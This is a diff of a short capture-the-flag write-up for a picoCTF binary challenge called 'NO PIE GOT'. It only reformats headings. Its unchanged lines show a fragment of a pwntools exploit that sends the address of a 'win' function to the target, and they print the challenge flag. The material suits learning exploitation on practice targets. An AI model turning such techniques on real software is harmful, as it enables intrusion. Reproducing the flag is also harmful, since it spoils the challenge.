@@ -1,7 +1,8 @@
-# Description
+# NO PIE GOT
+### 📄 Description
 if you mess some bytes around, you might print the flag (●'◡'●)
 
-## Solution
+## 🔑 Solution
 The solution is the same as the previous challenge (no joke).
 
 ```python
@@ -15,7 +16,7 @@ p.sendline(str(context.binary.functions["win"].address).encode("ascii"))
 log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
 ```
 
-## Flag
+### 🚩 Flag
 ```plain
 picoCTF{A_s0ng_0f_1C3_and_f1r3_e122890e}
 ```
